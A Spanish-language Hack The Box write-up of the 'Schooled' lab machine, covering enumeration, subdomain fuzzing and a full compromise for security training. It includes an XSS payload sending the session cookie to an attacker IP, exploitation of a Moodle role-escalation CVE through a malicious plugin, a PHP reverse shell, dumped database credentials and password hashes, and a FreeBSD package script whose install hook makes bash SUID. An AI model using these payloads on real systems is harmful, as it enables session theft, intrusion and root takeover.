---
layout: single
title: Schooled - Hack The Box
excerpt: "Sinceramente, Schooled ha sido la maquina que mas me ha gustado de HTB hasta la fecha, me ha parecido bastante realista y me ha tomado bastante tiempo, por toda la enumeracion que conlleva y busqueda de informacion por internet sobre CVEs,etc."
date: 2021-09-11
classes: wide
header:
  teaser: /assets/images/schooled/Untitled.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - infosec
tags:
  -   Web
  -   DNS Brute Force
  -   Moodle
  -   SUID
---

<div>
<p style = 'text-align:center;'>
<img src="http://www.hackthebox.eu/badge/image/497437" alt="" width="200px">
</p>
</div>

<div>
<p style = 'text-align:center;'>
<img src="https://fmash16.github.io/img/htb_schooled/card.png" alt="" width="600px">
</p>
</div>

<div>
<p style = 'text-align:center;'>
<img src="https://pic2.zhimg.com/80/v2-df2c12851f115fbf7c679f7a73fcea69_720w.jpg" alt="" width="250px">
</p>
</div>

# **ENUMERACION**

Como siempre lanzamos una serie de scripts basicos de enumeracion y detectamos servicios y versiones que corren en estos puertos con `NMAP`

```bash
❯ nmap -sCV -p22,80,33060 10.10.10.234 -oN scanPorts                                                                                                                                        
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-06 08:10 EDT                                                                                                                             
Nmap scan report for 10.10.10.234                                                                                                                                                           
Host is up (0.065s latency).                                                                                                                                                                
                                                                                                                                                                                            
PORT      STATE SERVICE VERSION                                                                                                                                                             
22/tcp    open  ssh     OpenSSH 7.9 (FreeBSD 20200214; protocol 2.0)                                                                                                                        
| ssh-hostkey:                                                                                                                                                                              
|   2048 1d:69:83:78:fc:91:f8:19:c8:75:a7:1e:76:45:05:dc (RSA)                                                                                                                              
|   256 e9:b2:d2:23:9d:cf:0e:63:e0:6d:b9:b1:a6:86:93:38 (ECDSA)                                                                                                                             
|_  256 7f:51:88:f7:3c:dd:77:5e:ba:25:4d:4c:09:25:ea:1f (ED25519)                                                                                                                           
80/tcp    open  http    Apache httpd 2.4.46 ((FreeBSD) PHP/7.4.15)                                                                                                                          
| http-methods:                                                                                                                                                                             
|_  Potentially risky methods: TRACE                                                                                                                                                        
|_http-server-header: Apache/2.4.46 (FreeBSD) PHP/7.4.15                                                                                                                                    
|_http-title: Schooled - A new kind of educational institute                                                                                                                                
33060/tcp open  mysqlx?                                                                                                                                                                     
| fingerprint-strings:                                                                                                                                                                      
|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp:                                                                                              
|     Invalid message"                                                                                                                                                                      
|     HY000                                                                                                                                                                                 
|   LDAPBindReq:                                                                                                                                                                            
|     *Parse error unserializing protobuf message"                                                                                                                                          
|     HY000                                                                                                                                                                                 
|   oracle-tns: 
|     Invalid message-frame."
|_    HY000
```

Tenemos el puerto 80 abierto, es un servicio http por lo que le lanzamos la herramienta `whatweb` para recopilar informacion sobre las tecnologias y versiones que usa la pagina web

```bash
❯ whatweb http://10.10.10.234/
http://10.10.10.234/ [200 OK] Apache[2.4.46], Bootstrap, Country[RESERVED][ZZ], Email[#,admissions@schooled.htb], HTML5, HTTPServer[FreeBSD][Apache/2.4.46 (FreeBSD) PHP/7.4.15], IP[10.10.10.234], PHP[7.4.15], Script, Title[Schooled - A new kind of educational institute], X-UA-Compatible[IE=edge]
```

Nos reporta el dominio `schooled.htb` → lo agregamos al `/etc/hosts`

```bash
❯ cat /etc/hosts
───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: /etc/hosts
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ 127.0.0.1   localhost
   2   │ 127.0.1.1   kali
   3   │ 
   4   │ 10.10.10.234    schooled.htb
```

Vamos a buscar rutas en la pagina web con la herramienta `gobuster`

```bash
❯ gobuster dir -u http://schooled.htb/ -w /opt/diccionario_medio.txt -t 100 -r -x html,php
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://schooled.htb/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /opt/diccionario_medio.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              html,php
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
2021/09/06 08:16:50 Starting gobuster in directory enumeration mode
===============================================================
/contact.html         (Status: 200) [Size: 11066]
/images               (Status: 200) [Size: 2440] 
/about.html           (Status: 200) [Size: 17784]
/index.html           (Status: 200) [Size: 20750]
/css                  (Status: 200) [Size: 1048] 
/js                   (Status: 200) [Size: 522]  
/fonts                (Status: 200) [Size: 838]  
/teachers.html        (Status: 200) [Size: 15997]
```

En `/teachers.html` encontramos lo que parece ser nombres de los profesores

![Untitled](/assets/images/schooled/Untitled%202.png)

No encuentro nada mas interesante, asi que me pongo a buscar posibles subdominios en la web, para ello utilizo la herramienta `wfuzz` (Web Fuzzer) , y utilizando un diccionario de [SecList](https://github.com/danielmiessler/SecLists) especifico para la busqueda de subdominios y la cabecera `-H 'Host: FUZZ.schooled.htb'` para que cada una de las lineas de ese diccionario me las vaya reemplazando en la palabra FUZZ de la cabecera, de esta forma cuando la respuesta tenga un numero de caracteres distinto en este caso a 20750 `--hh 20750` me lo reporta en la consola:

# **DNS BRUTE FORCE**

```bash
❯ wfuzz -c -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -t 200 --hc 404 --hh 20750 -H 'Host: FUZZ.schooled.htb' http://schooled.htb/
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************
Target: http://schooled.htb/
Total requests: 114441
====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                    
====================================================================
000000162:   200        1 L      5 W        84 Ch       "moodle"
```

Agregamos el subdominio encontrado al /etc/hosts

```bash
❯ cat /etc/hosts
───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: /etc/hosts
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ 127.0.0.1   localhost
   2   │ 127.0.1.1   kali
   3   │ 
   4   │ 10.10.10.234    schooled.htb moodle.schooled.htb
```

Encuentro un exploit muy critico para moodle, pero necesitamos obtener privilegios de administrador:

![Untitled](/assets/images/schooled/Untitled%203.png)

Puedo registrarme en esta nueva pagina y gano acceso a un moodle.

### ¿Que es Moodle?

Moodle es una herramienta de gestión de aprendizaje, o más concretamente de Learning Content Management, de distribución libre, escrita en PHP.

Investigando en la pagina, entro en el curso de matematicas y el profesor ha dejado un mensaje.

![Untitled](/assets/images/schooled/Untitled%204.png)

# **COOKIE HIJACKING**

Esto me hace pensar que podriamos realizar un Cookie Hijacking, segun el post de Manuel Philips, va a estar checkeando nuestro perfil de MoodNet y los que no lo tengan configurado los echará del curso, podemos intentar ingresar un XSS con etiquetas html para robarle su cookie de sesion, tal y como lo explican en este [POST](https://backtrackacademy.com/articulo/xss-capturando-cookies-de-sesion)

`<script>img = new Image(); img.src = "[http://192.168.1.44/a.php?"+document.cookie;](http://192.168.1.44/a.php?%22+document.cookie;)</script>`

![Untitled](/assets/images/schooled/Untitled%205.png)

```bash
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.234 - - [06/Sep/2021 08:35:19] code 404, message File not found
10.10.10.234 - - [06/Sep/2021 08:35:19] "GET /a.php?MoodleSession=94f6buarslr57gd7pt628fodh2 HTTP/1.1" 404 -
```

Hemos interceptado la cookie de sesion del profesor, la copiamos y pegamos en la extension de Firefox `Cookie Editor`

![Untitled](/assets/images/schooled/Untitled%206.png)

Recargamos la pagina y conseguimos entrar en la cuenta del profesor

![Untitled](/assets/images/schooled/Untitled%207.png)

Buscando vulnerabilidades en google, me topo con este [POST](https://www.incibe-cert.es/alerta-temprana/avisos-seguridad/multiples-vulnerabilidades-moodle-10), El cual nos dice:

# **EXPLOTACION CVE-2020-14321**

Los profesores de un curso podrían asignarse a sí mismos el rol de manager dentro de ese curso. Se ha reservado el identificador CVE-2020-14321 para esta vulnerabilidad.

Encuentro un POC en github acerca del CVE-2020-14321: [LINK](https://github.com/HoangKien1020/CVE-2020-14321)

Siguiendo los pasos:

1º Añadimos al usuario manager al curso:

![Untitled](/assets/images/schooled/Untitled%208.png)

![Untitled](/assets/images/schooled/Untitled%209.png)

2º Miramos el id en el perfil del profesor:

![Untitled](/assets/images/schooled/Untitled%2010.png)

3º En la peticion que hemos interceptado, cambiamos el id y el rol asignado:

![Untitled](/assets/images/schooled/Untitled%2011.png)

Hemos convertido al usuario miembro del rol manager, ahora podemos acceder como administrador.

4º Clickamos en el usuario y en el perfil accedemos al panel de administrador:

![Untitled](/assets/images/schooled/Untitled%2012.png)

![Untitled](/assets/images/schooled/Untitled%2013.png)

![Untitled](/assets/images/schooled/Untitled%2014.png)

5º Vamos a Users → Define Roles → Manager → Edit

Bajamos hasta abajo del todo y capturamos la peticion con BurpSuite de guardar:

![Untitled](/assets/images/schooled/Untitled%2015.png)

![Untitled](/assets/images/schooled/Untitled%2016.png)

Cambiamos toda la data menos el sesskey, por la data que hay al final de este [POST](https://github.com/HoangKien1020/CVE-2020-14321) y enviamos la peticion.

6º Vamos a Site Administration → Plugins → Install Plugins

Agregamos el rce.zip del [POST](https://github.com/HoangKien1020/CVE-2020-14321) y le damos a instalar

![Untitled](/assets/images/schooled/Untitled%2017.png)

Click en Continue:

![Untitled](/assets/images/schooled/Untitled%2018.png)

Y click de nuevo en Continue y en la ruta:

`http://moodle.schooled.htb/moodle/blocks/rce/lang/en/block_rce.php`

Tenemos una webShell:

![Untitled](/assets/images/schooled/Untitled%2019.png)

# **GANANDO ACCESO**

Despues de probar mil formas de obtener una shell, solo obtengo acceso al sistema, creando mi propio rce.zip pero en vez de una web shell en el archivo block_rce.php , meto ahi una reverse shell en php. Esta por defecto en kali linux `/usr/share/webshells/php/php-reverse-shell.php`

Luego comprimo el contenido de la carpeta:

`❯ zip rce.zip rce/lang/en/block_rce.php rce/version.php`

Lo subo de la misma forma anterior, y al abrir el archivo block_rce.php lo interpreta y me otorga una reverse shell.

```bash
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.6] from (UNKNOWN) [10.10.10.234] 14194
FreeBSD Schooled 13.0-BETA3 FreeBSD 13.0-BETA3 #0 releng/13.0-n244525-150b4388d3b: Fri Feb 19 04:04:34 UTC 2021     root@releng1.nyi.freebsd.org:/usr/obj/usr/src/amd64.amd64/sys/GENERIC  amd64
 7:31PM  up 25 mins, 0 users, load averages: 0.67, 0.50, 0.43
USER       TTY      FROM    LOGIN@  IDLE WHAT
uid=80(www) gid=80(www) groups=80(www)
sh: can't access tty; job control turned off
```

Buscando informacion sobre moodle, encuentro que guarda contraseñas en archivos de configuracion como este: [link](https://github.com/moodle/moodle/blob/master/config-dist.php)

Voy a grepear a ver si encuentra algo con esta informacion:

```bash
$ find . -type f -exec grep -i -I "dbpass" {} /dev/null \;
<data>
./usr/local/www/apache24/data/moodle/config.php:$CFG->dbpass    = 'PlaybookMaster2020';
<data>

$ cat /usr/local/www/apache24/data/moodle/config.php
<?php  // Moodle configuration file

unset($CFG);
global $CFG;
$CFG = new stdClass();

$CFG->dbtype    = 'mysqli';
$CFG->dblibrary = 'native';
$CFG->dbhost    = 'localhost';
$CFG->dbname    = 'moodle';
$CFG->dbuser    = 'moodle';
$CFG->dbpass    = 'PlaybookMaster2020';
$CFG->prefix    = 'mdl_';
$CFG->dboptions = array (
  'dbpersist' => 0,
  'dbport' => 3306,
  'dbsocket' => '',
  'dbcollation' => 'utf8_unicode_ci',
);

$CFG->wwwroot   = 'http://moodle.schooled.htb/moodle';
$CFG->dataroot  = '/usr/local/www/apache24/moodledata';
$CFG->admin     = 'admin';
```

Pero mysql no lo reconoce la maquina, asi que vamos a buscar la ruta absoluta del mysql

```bash
$ find / -type f -iname "mysql" 2>/dev/null
/usr/local/bin/mysql
/usr/local/share/bash-completion/completions/mysql
/var/mail/mysql

$ /usr/local/bin/mysql -u moodle -pPlaybookMaster2020 -e 'show databases;'
mysql: [Warning] Using a password on the command line interface can be insecure.
Database
information_schema
moodle

$ /usr/local/bin/mysql -u moodle -pPlaybookMaster2020 -e 'show tables from moodle;'                                                                                                         
mysql: [Warning] Using a password on the command line interface can be insecure.                                                                                                            
Tables_in_moodle                                                                                                                                                                            
mdl_analytics_indicator_calc                                                                                                                                                                
mdl_analytics_models
<data>
mdl_user

$ /usr/local/bin/mysql -u moodle -pPlaybookMaster2020 -e 'use moodle; describe mdl_user;'                                                                                                   
mysql: [Warning] Using a password on the command line interface can be insecure.                                                                                                            
<data>                                                                                                                                       
username        varchar(100)    NO                                                                                                                                                          
password        varchar(255)    NO                                                                                                                                                          
<data>

$ /usr/local/bin/mysql -u moodle -pPlaybookMaster2020 -e 'use moodle; select username,password from mdl_user;'
mysql: [Warning] Using a password on the command line interface can be insecure.
username        password
guest   $2y$10$u8DkSWjhZnQhBk1a0g1ug.x79uhkx/sa7euU8TI4FX4TCaXK6uQk2
admin   $2y$10$3D/gznFHdpV6PXt1cLPhX.ViTgs87DCE5KqphQhGYR5GFbcl4qTiW
bell_oliver89   $2y$10$N0feGGafBvl.g6LNBKXPVOpkvs8y/axSPyXb46HiFP3C9c42dhvgK
orchid_sheila89 $2y$10$YMsy0e4x4vKq7HxMsDk.OehnmAcc8tFa0lzj5b1Zc8IhqZx03aryC
chard_ellzabeth89       $2y$10$D0Hu9XehYbTxNsf/uZrxXeRp/6pmT1/6A.Q2CZhbR26lCPtf68wUC
morris_jake89   $2y$10$UieCKjut2IMiglWqRCkSzerF.8AnR8NtOLFmDUcQa90lair7LndRy
heel_james89    $2y$10$sjk.jJKsfnLG4r5rYytMge4sJWj4ZY8xeWRIrepPJ8oWlynRc9Eim
nash_michael89  $2y$10$yShrS/zCD1Uoy0JMZPCDB.saWGsPUrPyQZ4eAS50jGZUp8zsqF8tu
singh_rakesh89  $2y$10$Yd52KrjMGJwPUeDQRU7wNu6xjTMobTWq3eEzMWeA2KsfAPAcHSUPu
taint_marcus89  $2y$10$kFO4L15Elng2Z2R4cCkbdOHyh5rKwnG4csQ0gWUeu2bJGt4Mxswoa
walls_shaun89   $2y$10$EDXwQZ9Dp6UNHjAF.ZXY2uKV5NBjNBiLx/WnwHiQ87Dk90yZHf3ga
smith_john89    $2y$10$YRdwHxfstP0on0Yzd2jkNe/YE/9PDv/YC2aVtC97mz5RZnqsZ/5Em
white_jack89    $2y$10$PRy8LErZpSKT7YuSxlWntOWK/5LmSEPYLafDd13Nv36MxlT5yOZqK
travis_carl89   $2y$10$VO/MiMUhZGoZmWiY7jQxz.Gu8xeThHXCczYB0nYsZr7J5PZ95gj9S
mac_amy89       $2y$10$PgOU/KKquLGxowyzPCUsi.QRTUIrPETU7q1DEDv2Dt.xAjPlTGK3i
james_boris89   $2y$10$N4hGccQNNM9oWJOm2uy1LuN50EtVcba/1MgsQ9P/hcwErzAYUtzWq
pierce_allan    $2y$10$ia9fKz9.arKUUBbaGo2FM.b7n/QU1WDAFRafgD6j7uXtzQxLyR3Zy
henry_william89 $2y$10$qj67d57dL/XzjCgE0qD1i.ION66fK0TgwCFou9yT6jbR7pFRXHmIu
harper_zoe89    $2y$10$mnYTPvYjDwQtQuZ9etlFmeiuIqTiYxVYkmruFIh4rWFkC3V1Y0zPy
wright_travis89 $2y$10$XFE/IKSMPg21lenhEfUoVemf4OrtLEL6w2kLIJdYceOOivRB7wnpm
allen_matthew89 $2y$10$kFYnbkwG.vqrorLlAz6hT.p0RqvBwZK2kiHT9v3SHGa8XTCKbwTZq
sanders_wallis89        $2y$10$br9VzK6V17zJttyB8jK9Tub/1l2h7mgX1E3qcUbLL.GY.JtIBDG5u
higgins_jane    $2y$10$n9SrsMwmiU.egHN60RleAOauTK2XShvjsCS0tAR6m54hR1Bba6ni2
phillips_manuel $2y$10$ZwxEs65Q0gO8rN8zpVGU2eYDvAoVmWYYEhHBPovIHr8HZGBvEYEYG
carter_lianne   $2y$10$jw.KgN/SIpG2MAKvW8qdiub67JD7STqIER1VeRvAH4fs/DPF57JZe
parker_dan89    $2y$10$MYvrCS5ykPXX0pjVuCGZOOPxgj.fiQAZXyufW5itreQEc2IB2.OSi
parker_tim89    $2y$10$YCYp8F91YdvY2QCg3Cl5r.jzYxMwkwEm/QBGYIs.apyeCeRD7OD6S
tukutu  $2y$10$SPPk3i6KBvbmYBkIyFzUC.g0l7bdwlVwmc6W7i7ifC0KlI57ZK1gO
```

Como son muchos voy a ir a por el del usuario admin unicamente:

```bash
❯ john hashestocrack --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
!QAZ2wsx         (?)
1g 0:00:00:43 DONE (2021-09-06 16:26) 0.02320g/s 322.4p/s 322.4c/s 322.4C/s goodman..superpet
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Tenemos una contraseña y tambien tenemos dos usuarios con los que poder intentar conectarnos por ssh:

```bash
$ cat /etc/passwd | grep "sh"
root:*:0:0:Charlie &:/root:/bin/csh
man:*:9:9:Mister Man Pages:/usr/share/man:/usr/sbin/nologin
sshd:*:22:22:Secure Shell Daemon:/var/empty:/usr/sbin/nologin
jamie:*:1001:1001:Jamie:/home/jamie:/bin/sh
steve:*:1002:1002:User &:/home/steve:/bin/csh
$ 
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
❯ ssh jamie@10.10.10.234
Password for jamie@Schooled:
Last login: Tue Mar 16 14:44:53 2021 from 10.10.14.5
FreeBSD 13.0-BETA3 (GENERIC) #0 releng/13.0-n244525-150b4388d3b: Fri Feb 19 04:04:34 UTC 2021

Welcome to FreeBSD!
jamie@Schooled:~ $
jamie@Schooled:~ $ cat user.txt 
2f0dc91d654cd612a8da9----------
```

# **ESCALACION DE PRIVILEGIOS**

Miramos si tenemos privilegios SUID como el usuario jamie:

```bash
jamie@Schooled:/tmp $ sudo -l
User jamie may run the following commands on Schooled:
    (ALL) NOPASSWD: /usr/sbin/pkg update
    (ALL) NOPASSWD: /usr/sbin/pkg install *
```

En google encuentro un post sobre como crear un package customizado: [LINK](http://lastsummer.de/creating-custom-packages-on-freebsd/)

Voy a crear un package que ejecute el comadno que yo quiera, en este caso le otorgare permisos SUID a la bash

```bash
jamie@Schooled:/tmp $ ls -la /bin/bash
lrwxr-xr-x  1 root  wheel  19 Apr  1 17:02 /bin/bash -> /usr/local/bin/bash
jamie@Schooled:/tmp $ ls -la /usr/local/bin/bash                                                                                                                                            
-rwxr-xr-x  1 root  wheel  941288 Feb 20  2021 /usr/local/bin/bash
```

La /bin/bash tiene un enlace simbolico hacia /usr/local/bin/bash , por lo que tendremos que otorgarle permisos SUID a /usr/local/bin/bash

Para ello nos creamos en la maquina este script en bash siguiendo los pasos de la pagina:

```bash
jamie@Schooled:/tmp $ cat privesc 
#!/bin/sh

STAGEDIR=/tmp/stage
rm -rf ${STAGEDIR}
mkdir -p ${STAGEDIR}
cat >> ${STAGEDIR}/+PRE_DEINSTALL <<EOF
# careful here, this may clobber your system
EOF
cat >> ${STAGEDIR}/+POST_INSTALL <<EOF
# careful here, this may clobber your system
echo "Registering root shell"
chmod +s /usr/local/bin/bash
EOF
cat >> ${STAGEDIR}/+MANIFEST <<EOF
name: mypackage
version: "1.0_5"
origin: sysutils/mypackage
comment: "automates stuff"
desc: "automates tasks which can also be undone later"
maintainer: john@doe.it
www: https://doe.it
prefix: /
EOF
pkg create -m ${STAGEDIR}/ -r ${STAGEDIR}/ -o .
```

Le damos permiso de ejecucion (`chmod +x <FILENAME>`)  y lo ejecutamos:

```bash
jamie@Schooled:/tmp $ ./privesc                                                                                                                                                             
jamie@Schooled:/tmp $ sudo -u root /usr/sbin/pkg install --no-repo-update *.txz                                                                                                             
pkg: Repository FreeBSD has a wrong packagesite, need to re-create database                                                                                                                 
pkg: Repository FreeBSD cannot be opened. 'pkg update' required                                                                                                                             
Checking integrity... done (0 conflicting)                                                                                                                                                  
The following 1 package(s) will be affected (of 0 checked):                                                                                                                                 
                                                                                                                                                                                            
New packages to be INSTALLED:
        mypackage: 1.0_5

Number of packages to be installed: 1

Proceed with this action? [y/N]: y
[1/1] Installing mypackage-1.0_5...
Registering root shell
jamie@Schooled:/tmp $ ls -la /usr/local/bin/bash
-rwsr-sr-x  1 root  wheel  941288 Feb 20  2021 /usr/local/bin/bash
jamie@Schooled:/tmp $ /usr/local/bin/bash -p
[jamie@Schooled /tmp]# whoami
root
[jamie@Schooled /tmp]# cat /root/root.txt 
ad5db29f4c01d63a0beed7--------
```